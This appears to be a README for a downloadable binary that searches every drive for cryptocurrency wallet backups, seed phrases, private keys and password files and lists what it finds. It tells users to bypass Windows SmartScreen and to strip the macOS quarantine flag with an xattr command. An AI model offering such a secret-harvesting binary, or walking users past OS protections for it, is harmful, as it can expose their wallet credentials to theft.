# Muffin's Treasure Hunting Tool 🐾✨

**Muffin is here to sniff out your crypto treasures!**  

---

## 🐶 What Does This Tool Do?

Muffin's Treasure Hunting Tool scans your computer for crypto-related files, such as wallet backups, recovery phrases, sensitive keys, or JSON wallet files. It searches through all storage drives (internal and external) for keywords related to cryptocurrency wallets, private keys, Ethereum and Bitcoin addresses, and other important crypto-related information.

The results are saved in:

1. **A text file** for quick and easy viewing.
2. **A spreadsheet** with advanced filtering, sorting, and clickable paths for easier navigation.

---

## 🚀 Features:

- **Comprehensive Crypto File Search:**  
   - Includes keywords like "crypto," "wallet," "bitcoin," "ethereum," "password," "private," and many more.
   - Supports identifying JSON wallet structures (e.g., MetaMask, MyEtherWallet).  
   - Detects Ethereum and Bitcoin public/private keys.  

- **Deep Content Scanning:**  
   - Scans `.txt`, `.docx`, and `.pdf` files for specific crypto-related keywords and structures.  

- **Smart Folder Detection:**  
   - Displays the most meaningful folder name for results, such as `Desktop` or `Documents`, instead of generic ones like `Users`.  

- **Dynamic Drive Scanning:**  
   - Automatically detects and scans all available storage drives, including external flash drives.  

- **User-Friendly Console Display:**  
   - Real-time progress logs with fun emojis and live updates of files being scanned.  
   - A 30-second countdown timer before starting, with an option to skip.  

- **Export-Friendly Results:**  
   - Text and spreadsheet exports with drive, folder, and file details, plus clickable links to file locations.  

- **Cross-Platform Compatibility:**  
   - Works seamlessly on Windows and macOS.  

---

## 🛠️ How to Use It  

### Step 1: Download the Tool  

1. Visit the GitHub repository hosting Muffin's Treasure Hunting Tool.  
2. Download the correct file for your operating system:  
   - **Windows:** `Muffins_Treasure_Hunt_Windows.zip`  
   - **Mac:** `Muffins_Treasure_Hunt_Mac.zip`  

---

### Step 2: Extract the Files  

- **Windows:**  
   1. Right-click the `.zip` file and select "Extract All."  
   2. Open the extracted folder.  

- **Mac:**  
   1. Double-click the `.zip` file to extract it.  
   2. Open the extracted folder.  

---

### Step 3: Run the Tool  

- **Windows:**  
   1. Double-click the file named `Muffins_Treasure_Hunt_Windows.exe`.  
   2. If Windows blocks the program, click **More Info > Run Anyway**.  

- **Mac:**  
   1. Double-click the file named `Muffins_Treasure_Hunt_Mac`.  
   2. If macOS blocks the program:  
      - Go to **System Preferences > Security & Privacy > Open Anyway**.  
      - Alternatively, run the following command in Terminal:  
        ```bash
        xattr -d com.apple.quarantine /path/to/Muffins_Treasure_Hunt_Mac
        ```

---

### Step 4: Watch the Magic  

1. **Welcome Screen:**  
   The program will display a fun intro screen with a 30-second countdown (press any key to skip).  

2. **Drive Detection:**  
   Muffin will automatically list all detected drives, such as `C:\` or `/Volumes/ExternalDrive`.  

3. **Real-Time Logging:**  
   As Muffin sniffs through your files, you'll see updates in the console with file names and matching icons for relevant keywords.  

---

### Step 5: View the Results  

After the hunt is complete, two files will be saved in a new folder on your Desktop named **Muffins_Treasure_Hunt_Results**:

1. **`Muffins_Treasure_Hunt_Path_Log.txt`:**  
   A plain text file listing all matches, their paths, and associated keywords.  

2. **`Muffins_Treasure_Hunt_Results.xlsx`:**  
   A detailed spreadsheet with:  
   - **Drive**: The drive where the file was found.  
   - **Main Folder**: The most relevant folder for the result (e.g., `Documents`, `Desktop`).  
   - **Keyword Match**: The matched keyword(s) triggering the result.  
   - **File Type**: The file extension (e.g., `.pdf`, `.txt`).  
   - **File Name**: The name of the file.  
   - **File Path**: A clickable link to the file's folder (not the file itself).  

---

## 📝 Notes:

- **Safety:** This tool does not modify or delete files; it only searches and records.  
- **Performance:** Depending on the size of your drives, the scan may take some time.  
- **Privacy:** Results stay on your computer—nothing is sent online.  

---

## 🐾 Muffin’s Mission:

Muffin’s Treasure Hunting Tool is designed to uncover forgotten or lost crypto-related files from your computer. It’s perfect for anyone looking to rediscover hidden treasures from old wallets, backups, and recovery files.  

Let Muffin help you uncover hidden crypto treasures! 🐶💎  

For any questions, reach out via the GitHub repository's **Issues** section.  

🐾✨
